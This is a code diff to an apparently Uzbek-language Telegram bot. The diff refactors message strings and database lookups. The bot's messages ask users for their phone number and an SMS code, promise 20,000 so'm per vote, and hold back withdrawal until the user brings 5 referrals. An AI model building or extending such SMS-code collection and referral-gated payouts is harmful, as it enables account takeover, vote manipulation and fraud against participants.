@@ -233,6 +233,9 @@ async def start(message: types.Message):
             telegram_id
         )
         
+        referal_link = generate_referal_link(telegram_id)
+        referal_count = user['referal_count']
+        
         if user['phone'] == "no_phone_yet" or user['phone'] is None:
             user_states[telegram_id] = "waiting_phone"
             await message.answer(
@@ -244,8 +247,8 @@ async def start(message: types.Message):
                 f"2️⃣ SMS kodni kiriting\n"
                 f"3️⃣ Admin tasdiqlaydi\n"
                 f"4️⃣ 20 000 so'm olasiz!\n\n"
-                f"🔗 <b>Referal link:</b> {generate_referal_link(telegram_id)}\n"
-                f"👥 <b>Referallar soni:</b> {user['referal_count']}\n\n"
+                f"🔗 <b>Referal link:</b> {referal_link}\n"
+                f"👥 <b>Referallar soni:</b> {referal_count}\n\n"
                 f"⚡️ <b>Tez va oson!</b>\n"
                 f"💎 <b>Kafolatlangan to'lov!</b>\n\n"
                 f"📱 <b>Telefon raqamingizni yuboring:</b>\n"
@@ -258,8 +261,8 @@ async def start(message: types.Message):
                 f"👋 <b>Xush kelibsiz!</b>\n\n"
                 f"📱 <b>Telefon:</b> {user['phone']}\n"
                 f"💰 <b>Balans:</b> {user['balance']:,} so'm\n"
-                f"👥 <b>Referallar soni:</b> {user['referal_count']}\n"
-                f"🔗 <b>Referal link:</b> {generate_referal_link(telegram_id)}\n\n"
+                f"👥 <b>Referallar soni:</b> {referal_count}\n"
+                f"🔗 <b>Referal link:</b> {referal_link}\n\n"
                 f"🎁 <b>Yana ovoz bering va yana 20 000 so'm oling!</b>\n\n"
                 f"👇 Pastdagi tugmalardan foydalaning:",
                 reply_markup=user_menu,
@@ -486,13 +489,18 @@ async def admin_action(callback: types.CallbackQuery):
                     telegram_id
                 )
                 
+                referal_count = await conn.fetchval(
+                    "SELECT referal_count FROM users WHERE telegram_id = $1",
+                    telegram_id
+                )
+                
                 try:
                     await bot.send_message(
                         telegram_id,
                         f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                         f"💰 Hisobingizga <b>+20 000 so'm</b> qo'shildi!\n\n"
-                        f"📊 Joriy balans: <b>{new_balance:,} so'm</b>\n\n"
-                        f"👥 Referallar soni: <b>{(await conn.fetchval('SELECT referal_count FROM users WHERE telegram_id = $1', telegram_id))}</b>",
+                        f"📊 Joriy balans: <b>{new_balance:,} so'm</b>\n"
+                        f"👥 Referallar: {referal_count}/5",
                         reply_markup=user_menu,
                         parse_mode="HTML"
                     )
@@ -604,7 +612,7 @@ async def show_balance(message: types.Message):
         if conn:
             await conn.close()
 
-# ================= 8. YECHISH (O'ZGARTIRILGAN) =================
+# ================= 8. YECHISH =================
 @dp.message(lambda msg: msg.text == "💸 Yechish")
 async def withdraw_start(message: types.Message):
     telegram_id = message.from_user.id
@@ -636,7 +644,7 @@ async def withdraw_start(message: types.Message):
         balance = user['balance']
         referal_count = user['referal_count']
         
-        # ✅ TEKSHIRISHLAR
+        # TEKSHIRISHLAR
         if balance < 20000:
             await message.answer(
                 f"❌ Balans: {balance:,} so'm\n"
@@ -648,17 +656,18 @@ async def withdraw_start(message: types.Message):
             return
         
         if referal_count < 5:
+            referal_link = generate_referal_link(telegram_id)
             await message.answer(
                 f"❌ Referallar: {referal_count}/5\n\n"
                 f"👥 Yechish uchun kamida 5 ta referal kerak!\n"
-                f"🔗 Referal link: {generate_referal_link(telegram_id)}\n\n"
+                f"🔗 Referal link: {referal_link}\n\n"
                 f"📤 Do'stlaringizni taklif qiling!",
                 reply_markup=user_menu,
                 parse_mode="HTML"
             )
             return
         
-        # ✅ HAMMA SHARTLAR BAJARILDI
+        # HAMMA SHARTLAR BAJARILDI
         withdraw_states[telegram_id] = "waiting_card_or_phone"
         await message.answer(
             f"✅ <b>Barcha shartlar bajarildi!</b>\n\n"
@@ -716,6 +725,11 @@ async def withdraw_card_or_phone(message: types.Message):
         user_info = await bot.get_chat(telegram_id)
         username = user_info.username if user_info.username else "mavjud_emas"
         
+        phone_from_db = await conn.fetchval(
+            "SELECT phone FROM users WHERE telegram_id = $1",
+            telegram_id
+        )
+        
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
                 [
@@ -733,7 +747,7 @@ async def withdraw_card_or_phone(message: types.Message):
             f"👤 Username: @{username}\n"
             f"💰 Balans: {user['balance']:,} so'm\n"
             f"👥 Referallar: {user['referal_count']}\n"
-            f"📞 Telefon: {await conn.fetchval('SELECT phone FROM users WHERE telegram_id = $1', telegram_id)}\n"
+            f"📞 Telefon: {phone_from_db}\n"
             f"💳 Karta: {data if len(data.replace(' ', '')) >= 13 else '❌'}\n"
             f"📱 Tel (yechish): {data if len(data.replace(' ', '')) < 13 else '❌'}",
             reply_markup=keyboard,
@@ -861,12 +875,18 @@ async def get_referal_link(message: types.Message):
             return
         
         referal_link = generate_referal_link(telegram_id)
+        referal_count = user['referal_count']
+        
+        if referal_count >= 5:
+            status_text = "✅ Yechish mumkin!"
+        else:
+            status_text = f"⏳ Yana {5 - referal_count} ta referal kerak"
         
         await message.answer(
             f"🔗 <b>Referal link</b>\n\n"
             f"📎 {referal_link}\n\n"
-            f"👥 Referallar: {user['referal_count']}/5\n"
-            f"{'✅ Yechish mumkin!' if user['referal_count'] >= 5 else f'⏳ Yana {5 - user['referal_count']} ta referal kerak'}\n\n"
+            f"👥 Referallar: {referal_count}/5\n"
+            f"{status_text}\n\n"
             f"💡 Do'stlaringizni taklif qiling!",
             reply_markup=user_menu,
             parse_mode="HTML"
